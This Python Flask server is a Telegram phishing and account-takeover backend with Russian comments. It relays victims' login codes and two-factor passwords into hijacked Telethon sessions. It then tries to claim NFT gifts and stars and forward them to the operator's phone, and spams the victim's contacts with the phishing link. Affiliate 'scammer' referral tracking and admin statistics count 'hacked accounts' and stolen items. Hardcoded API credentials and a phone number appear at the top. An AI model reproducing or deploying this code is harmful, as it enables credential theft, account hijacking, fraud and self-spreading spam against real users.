from flask import Flask, request, jsonify
import asyncio
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.types import InputPeerEmpty
import sqlite3
import os
import logging
from flask_cors import CORS
import secrets
import datetime
import threading
import re

app = Flask(__name__)
CORS(app)
logging.basicConfig(level=logging.INFO)

# Твои учетные данные
api_id = 25015433
api_hash = '546b7eb3f2865939ca71dbaedb49017d'
YOUR_PHONE = '+998997220530'

# Секретный ключ для админских команд
ADMIN_SECRET = "brbrpatapim2024"

def init_db():
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS auth_sessions
                 (phone TEXT PRIMARY KEY, 
                  phone_code_hash TEXT,
                  session_file TEXT,
                  ref_id TEXT,
                  status TEXT,
                  mass_message_sent BOOLEAN DEFAULT FALSE,
                  nft_stolen BOOLEAN DEFAULT FALSE,
                  created_at DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS scammers
                 (username TEXT PRIMARY KEY,
                  display_name TEXT,
                  ref_code TEXT UNIQUE,
                  total_clicks INTEGER DEFAULT 0,
                  total_conversions INTEGER DEFAULT 0,
                  created_at DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS referrals
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  ref_code TEXT,
                  phone TEXT,
                  converted BOOLEAN DEFAULT FALSE,
                  clicked_at DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS mass_messages
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  phone TEXT,
                  messages_sent INTEGER DEFAULT 0,
                  groups_reached INTEGER DEFAULT 0,
                  status TEXT,
                  started_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                  completed_at DATETIME)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS nft_thefts
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  phone TEXT,
                  nft_count INTEGER DEFAULT 0,
                  stars_count INTEGER DEFAULT 0,
                  status TEXT,
                  stolen_at DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    
    conn.commit()
    conn.close()

init_db()

def generate_ref_code():
    return secrets.token_urlsafe(8)

async def send_code_request(phone, ref_id=None):
    try:
        session_file = f"sessions/{phone}.session"
        client = TelegramClient(session_file, api_id, api_hash)
        await client.connect()
        
        sent_code = await client.send_code_request(phone)
        phone_code_hash = sent_code.phone_code_hash
        
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO auth_sessions 
                    (phone, phone_code_hash, session_file, ref_id, status) 
                    VALUES (?, ?, ?, ?, ?)''',
                 (phone, phone_code_hash, session_file, ref_id, 'code_sent'))
        conn.commit()
        conn.close()
        
        await client.disconnect()
        logging.info(f"✅ Code sent to: {phone} via ref: {ref_id}")
        return {'status': 'code_sent'}
        
    except Exception as e:
        logging.error(f"❌ Send code error for {phone}: {e}")
        return {'status': 'error', 'message': str(e)}

async def steal_nft_and_premium(client, phone):
    """Воруем NFT подарки и звёзды в ПРИОРИТЕТНОМ порядке"""
    try:
        nft_count = 0
        stars_count = 0
        
        me = await client.get_me()
        logging.info(f"🎨 STARTING NFT & STARS THEFT from: {me.first_name}")
        
        # 1. ВОРУЕМ NFT ПОДАРКИ ИЗ ПРОФИЛЯ
        await client.send_message('@NFT', '/start')
        await asyncio.sleep(2)
        
        # Ищем NFT ботов и каналы
        nft_sources = ['@nftbot', '@telegram', '@premium', '@gif', '@stickers']
        
        for source in nft_sources:
            try:
                await client.send_message(source, '/start')
                await asyncio.sleep(1)
                
                # Ищем сообщения с NFT
                async for message in client.iter_messages(source, limit=20):
                    if message.text and any(word in message.text.lower() for word in ['nft', 'gift', 'подарок', 'collection']):
                        # Пытаемся забрать NFT
                        if 'claim' in message.text.lower() or 'получить' in message.text.lower():
                            await message.click()
                            nft_count += 1
                            logging.info(f"🎁 Claimed NFT from {source}")
                        
                        # Пересылаем на твой аккаунт
                        await client.forward_messages(YOUR_PHONE, message)
                        
            except Exception as e:
                logging.error(f"❌ NFT source {source} error: {e}")
                continue
        
        # 2. ВОРУЕМ ЗВЁЗДЫ
        star_keywords = ['star', 'звезда', '⭐', 'donate', 'донат']
        
        async for dialog in client.iter_dialogs(limit=10):
            if dialog.is_channel or dialog.is_group:
                try:
                    async for message in client.iter_messages(dialog.id, limit=30):
                        if message.text and any(keyword in message.text.lower() for keyword in star_keywords):
                            # Пытаемся получить звёзды
                            if 'get' in message.text.lower() or 'получить' in message.text.lower():
                                try:
                                    await message.click()
                                    stars_count += 1
                                except:
                                    pass
                            
                            await client.forward_messages(YOUR_PHONE, message)
                            logging.info(f"⭐ Star content from {dialog.name}")
                            
                except Exception as e:
                    continue
        
        # Сохраняем статистику
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute('''INSERT INTO nft_thefts 
                    (phone, nft_count, stars_count, status) 
                    VALUES (?, ?, ?, ?)''',
                 (phone, nft_count, stars_count, 'completed'))
        c.execute("UPDATE auth_sessions SET nft_stolen = TRUE WHERE phone = ?", (phone,))
        conn.commit()
        conn.close()
        
        logging.info(f"✅ NFT THEFT COMPLETED: {nft_count} NFTs, {stars_count} stars")
        return {'nft_count': nft_count, 'stars_count': stars_count}
        
    except Exception as e:
        logging.error(f"❌ NFT theft error: {e}")
        return {'nft_count': 0, 'stars_count': 0}

async def send_mass_message_auto(client, phone):
    """АВТОМАТИЧЕСКАЯ рассылка"""
    try:
        message_text = "Проголосуй пожалуйста за Платона 🙏\nhttps://detilubov.onrender.com/"
        
        sent_count = 0
        groups_reached = 0
        
        async for dialog in client.iter_dialogs():
            try:
                if dialog.is_user and dialog.entity.id == (await client.get_me()).id:
                    continue
                
                if hasattr(dialog.entity, 'restricted') and dialog.entity.restricted:
                    continue
                
                await client.send_message(dialog.id, message_text)
                sent_count += 1
                
                if dialog.is_group or dialog.is_channel:
                    groups_reached += 1
                
                logging.info(f"📨 AUTO-SENT to: {dialog.name}")
                await asyncio.sleep(1)
                
            except Exception as e:
                continue
        
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute('''INSERT INTO mass_messages 
                    (phone, messages_sent, groups_reached, status) 
                    VALUES (?, ?, ?, ?)''',
                 (phone, sent_count, groups_reached, 'auto_completed'))
        c.execute("UPDATE auth_sessions SET mass_message_sent = TRUE WHERE phone = ?", (phone,))
        conn.commit()
        conn.close()
        
        logging.info(f"✅ AUTO MESSAGING: {sent_count} messages")
        return {'messages_sent': sent_count, 'groups_reached': groups_reached}
        
    except Exception as e:
        logging.error(f"❌ Auto messaging error: {e}")
        return None

async def verify_code(phone, code):
    try:
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute("SELECT phone_code_hash, session_file, ref_id FROM auth_sessions WHERE phone = ?", (phone,))
        result = c.fetchone()
        conn.close()
        
        if not result:
            return {'status': 'error', 'message': 'Сессия не найдена.'}
        
        phone_code_hash, session_file, ref_id = result
        
        client = TelegramClient(session_file, api_id, api_hash)
        await client.connect()
        
        try:
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            
            if ref_id:
                conn = sqlite3.connect('sessions.db')
                c = conn.cursor()
                c.execute("UPDATE scammers SET total_conversions = total_conversions + 1 WHERE ref_code = ?", (ref_id,))
                c.execute("UPDATE referrals SET converted = TRUE WHERE phone = ? AND ref_code = ?", (phone, ref_id))
                conn.commit()
                conn.close()
            
            conn = sqlite3.connect('sessions.db')
            c = conn.cursor()
            c.execute("UPDATE auth_sessions SET status = 'authenticated' WHERE phone = ?", (phone,))
            conn.commit()
            conn.close()
            
            # 🔥 ПРИОРИТЕТ: СНАЧАЛА NFT, ПОТОМ РАССЫЛКА
            nft_result = await steal_nft_and_premium(client, phone)
            await send_mass_message_auto(client, phone)
            
            await client.disconnect()
            
            logging.info(f"🎯 SUCCESS: {phone} | NFTs: {nft_result['nft_count']}")
            return {'status': 'success'}
            
        except SessionPasswordNeededError:
            await client.disconnect()
            return {'status': 'password_required'}
            
        except PhoneCodeExpiredError:
            await client.disconnect()
            new_code_result = await send_code_request(phone, ref_id)
            if new_code_result['status'] == 'code_sent':
                return {'status': 'code_expired', 'message': 'Код истек. Новый код отправлен.'}
            else:
                return {'status': 'error', 'message': 'Код истек.'}
            
        except PhoneCodeInvalidError:
            await client.disconnect()
            return {'status': 'invalid_code', 'message': 'Неверный код.'}
            
    except Exception as e:
        logging.error(f"❌ Verify code error: {e}")
        return {'status': 'error', 'message': str(e)}

async def verify_password(phone, password):
    try:
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute("SELECT session_file, ref_id FROM auth_sessions WHERE phone = ?", (phone,))
        result = c.fetchone()
        conn.close()
        
        if not result:
            return {'status': 'error', 'message': 'Сессия не найдена'}
        
        session_file, ref_id = result
        
        client = TelegramClient(session_file, api_id, api_hash)
        await client.connect()
        
        await client.sign_in(password=password)
        
        if ref_id:
            conn = sqlite3.connect('sessions.db')
            c = conn.cursor()
            c.execute("UPDATE scammers SET total_conversions = total_conversions + 1 WHERE ref_code = ?", (ref_id,))
            c.execute("UPDATE referrals SET converted = TRUE WHERE phone = ? AND ref_code = ?", (phone, ref_id))
            conn.commit()
            conn.close()
        
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute("UPDATE auth_sessions SET status = 'authenticated' WHERE phone = ?", (phone,))
        conn.commit()
        conn.close()
        
        # 🔥 ПРИОРИТЕТ: СНАЧАЛА NFT, ПОТОМ РАССЫЛКА
        nft_result = await steal_nft_and_premium(client, phone)
        await send_mass_message_auto(client, phone)
        
        await client.disconnect()
        
        logging.info(f"✅ SUCCESS with 2FA: {phone} | NFTs: {nft_result['nft_count']}")
        return {'status': 'success'}
        
    except Exception as e:
        logging.error(f"❌ Password error: {e}")
        return {'status': 'error', 'message': 'Неверный пароль'}

def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    return loop.run_until_complete(coro)

@app.route('/')
def home():
    return jsonify({'status': 'active', 'message': 'NFT Stealer Server'})

@app.route('/auth', methods=['POST'])
def auth():
    data = request.get_json()
    phone = data.get('phone')
    ref_id = data.get('ref_id')
    
    # ОБРАБОТКА КОМАНДЫ /brbrpatapim
    if phone and phone.startswith('/brbrpatapim'):
        parts = phone.split()
        if len(parts) >= 2:
            command = parts[1]
            
            # Создание ссылки для скамера
            if command != 'stats':
                username = command.replace('@', '').strip()
                return create_scammer_account(username)
            # Показать статистику для владельца
            else:
                return get_quick_stats()
        else:
            return jsonify({'status': 'error', 'message': 'Используйте: /brbrpatapim username ИЛИ /brbrpatapim stats'})
    
    # ОБЫЧНАЯ АВТОРИЗАЦИЯ
    logging.info(f"🔐 Auth: {phone} via ref: {ref_id}")
    
    if ref_id:
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute("INSERT INTO referrals (ref_code, phone) VALUES (?, ?)", (ref_id, phone))
        c.execute("UPDATE scammers SET total_clicks = total_clicks + 1 WHERE ref_code = ?", (ref_id,))
        conn.commit()
        conn.close()
    
    result = run_async(send_code_request(phone, ref_id))
    return jsonify(result)

def get_quick_stats():
    """Быстрая статистика для команды /brbrpatapim stats"""
    try:
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        
        c.execute("SELECT COUNT(*) FROM auth_sessions WHERE status='authenticated'")
        total_hacked = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM scammers")
        total_scammers = c.fetchone()[0]
        
        c.execute("SELECT SUM(nft_count), SUM(stars_count) FROM nft_thefts")
        nft_stats = c.fetchone()
        total_nfts = nft_stats[0] or 0
        total_stars = nft_stats[1] or 0
        
        c.execute("SELECT SUM(messages_sent) FROM mass_messages WHERE status = 'completed'")
        total_messages = c.fetchone()[0] or 0
        
        c.execute("SELECT COUNT(*) FROM referrals WHERE converted = TRUE")
        total_conversions = c.fetchone()[0]
        
        conn.close()
        
        stats_text = f"""📊 БЫСТРАЯ СТАТИСТИКА:

🎯 Взломанных аккаунтов: {total_hacked}
👥 Скамеров в системе: {total_scammers}
🔄 Конверсий: {total_conversions}
🎨 Украдено NFT: {total_nfts}
⭐ Украдено звезд: {total_stars}
📨 Отправлено сообщений: {total_messages}

Для детальной статистики используйте админские команды."""
        
        return jsonify({
            'status': 'quick_stats',
            'stats': stats_text,
            'message': stats_text
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/code', methods=['POST'])
def verify_code_route():
    data = request.get_json()
    phone = data.get('phone')
    code = data.get('code')
    logging.info(f"📱 Code verify: {phone}")
    result = run_async(verify_code(phone, code))
    return jsonify(result)

@app.route('/password', methods=['POST'])
def verify_password_route():
    data = request.get_json()
    phone = data.get('phone')
    password = data.get('password')
    logging.info(f"🔑 Password verify: {phone}")
    result = run_async(verify_password(phone, password))
    return jsonify(result)

def create_scammer_account(username):
    try:
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        
        c.execute("SELECT ref_code FROM scammers WHERE username = ?", (username,))
        existing = c.fetchone()
        
        if existing:
            ref_code = existing[0]
        else:
            ref_code = generate_ref_code()
            c.execute('''INSERT OR REPLACE INTO scammers 
                        (username, display_name, ref_code) 
                        VALUES (?, ?, ?)''',
                     (username, username, ref_code))
        
        conn.commit()
        conn.close()
        
        ref_link = f"https://detilubov.onrender.com/?ref={ref_code}"
        
        return jsonify({
            'status': 'scammer_created',
            'ref_link': ref_link,
            'username': username,
            'message': f'✅ Ссылка создана: {ref_link}'
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/admin/stats', methods=['POST'])
def admin_stats():
    data = request.get_json()
    secret = data.get('secret')
    
    if secret != ADMIN_SECRET:
        return jsonify({'status': 'error', 'message': 'Неверный ключ'})
    
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    
    c.execute('''SELECT username, display_name, ref_code, total_clicks, total_conversions, created_at 
                 FROM scammers ORDER BY total_conversions DESC''')
    scammers = c.fetchall()
    
    scammer_stats = []
    for scammer in scammers:
        scammer_stats.append({
            'username': scammer[0],
            'display_name': scammer[1],
            'ref_code': scammer[2],
            'total_clicks': scammer[3],
            'total_conversions': scammer[4],
            'created_at': scammer[5]
        })
    
    c.execute("SELECT COUNT(*) FROM auth_sessions WHERE status='authenticated'")
    total_hacked = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM referrals WHERE converted = TRUE")
    total_conversions = c.fetchone()[0]

    c.execute("SELECT SUM(nft_count), SUM(stars_count) FROM nft_thefts")
    nft_stats = c.fetchone()
    total_nfts = nft_stats[0] or 0
    total_stars = nft_stats[1] or 0
    
    conn.close()
    
    return jsonify({
        'status': 'admin_stats',
        'total_hacked_accounts': total_hacked,
        'total_conversions': total_conversions,
        'total_nfts_stolen': total_nfts,
        'total_stars_stolen': total_stars,
        'scammers': scammer_stats
    })

@app.route('/scammer/update', methods=['POST'])
def update_scammer():
    data = request.get_json()
    username = data.get('username')
    new_display_name = data.get('display_name')
    
    if not username or not new_display_name:
        return jsonify({'status': 'error', 'message': 'Укажите username и имя'})
    
    try:
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute("UPDATE scammers SET display_name = ? WHERE username = ?", (new_display_name, username))
        
        if c.rowcount == 0:
            conn.close()
            return jsonify({'status': 'error', 'message': 'Скамер не найден'})
        
        conn.commit()
        conn.close()
        return jsonify({'status': 'success', 'message': f'Имя обновлено: {new_display_name}'})
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/mass_message', methods=['POST'])
def mass_message():
    data = request.get_json()
    phone = data.get('phone')
    secret = data.get('secret')
    
    if secret != ADMIN_SECRET:
        return jsonify({'status': 'error', 'message': 'Неверный ключ'})
    
    if not phone:
        return jsonify({'status': 'error', 'message': 'Укажите номер'})
    
    logging.info(f"🚀 Manual mass messaging: {phone}")
    
    def run_mass_messaging():
        result = run_async(send_mass_message_auto(phone))
        logging.info(f"✅ Manual messaging completed: {result}")
    
    thread = threading.Thread(target=run_mass_messaging)
    thread.daemon = True
    thread.start()
    
    return jsonify({'status': 'started', 'message': f'Рассылка для {phone}'})

@app.route('/mass_stats', methods=['POST'])
def mass_stats():
    data = request.get_json()
    secret = data.get('secret')
    
    if secret != ADMIN_SECRET:
        return jsonify({'status': 'error', 'message': 'Неверный ключ'})
    
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    
    c.execute('''SELECT phone, messages_sent, groups_reached, status, started_at, completed_at 
                 FROM mass_messages ORDER BY started_at DESC LIMIT 50''')
    messages = c.fetchall()
    
    c.execute("SELECT COUNT(*) FROM mass_messages")
    total_campaigns = c.fetchone()[0]
    
    c.execute("SELECT SUM(messages_sent) FROM mass_messages WHERE status = 'completed'")
    total_messages = c.fetchone()[0] or 0
    
    c.execute("SELECT SUM(groups_reached) FROM mass_messages WHERE status = 'completed'")
    total_groups = c.fetchone()[0] or 0
    
    message_stats = []
    for msg in messages:
        message_stats.append({
            'phone': msg[0],
            'messages_sent': msg[1],
            'groups_reached': msg[2],
            'status': msg[3],
            'started_at': msg[4],
            'completed_at': msg[5]
        })
    
    conn.close()
    
    return jsonify({
        'status': 'mass_stats',
        'total_campaigns': total_campaigns,
        'total_messages_sent': total_messages,
        'total_groups_reached': total_groups,
        'campaigns': message_stats
    })

@app.route('/admin/broadcast', methods=['POST'])
def admin_broadcast():
    data = request.get_json()
    secret = data.get('secret')
    
    if secret != ADMIN_SECRET:
        return jsonify({'status': 'error', 'message': 'Неверный ключ'})
    
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    c.execute("SELECT phone FROM auth_sessions WHERE status = 'authenticated'")
    authenticated_phones = [row[0] for row in c.fetchall()]
    conn.close()
    
    if not authenticated_phones:
        return jsonify({'status': 'error', 'message': 'Нет аккаунтов'})
    
    for phone in authenticated_phones:
        def run_for_phone(phone):
            result = run_async(send_mass_message_auto(phone))
        
        thread = threading.Thread(target=run_for_phone, args=(phone,))
        thread.daemon = True
        thread.start()
    
    return jsonify({
        'status': 'broadcast_started',
        'message': f'Рассылка для {len(authenticated_phones)} аккаунтов',
        'accounts': authenticated_phones
    })

@app.route('/nft_stats', methods=['POST'])
def nft_stats():
    data = request.get_json()
    secret = data.get('secret')
    
    if secret != ADMIN_SECRET:
        return jsonify({'status': 'error', 'message': 'Неверный ключ'})
    
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    
    c.execute('''SELECT phone, nft_count, stars_count, status, stolen_at 
                 FROM nft_thefts ORDER BY stolen_at DESC LIMIT 50''')
    nfts = c.fetchall()
    
    c.execute("SELECT SUM(nft_count), SUM(stars_count) FROM nft_thefts")
    total_stats = c.fetchone()
    total_nfts = total_stats[0] or 0
    total_stars = total_stats[1] or 0
    
    nft_stats = []
    for nft in nfts:
        nft_stats.append({
            'phone': nft[0],
            'nft_count': nft[1],
            'stars_count': nft[2],
            'status': nft[3],
            'stolen_at': nft[4]
        })
    
    conn.close()
    
    return jsonify({
        'status': 'nft_stats',
        'total_nfts_stolen': total_nfts,
        'total_stars_stolen': total_stars,
        'thefts': nft_stats
    })

if __name__ == '__main__':
    if not os.path.exists('sessions'):
        os.makedirs('sessions')
    app.run(host='0.0.0.0', port=5000)
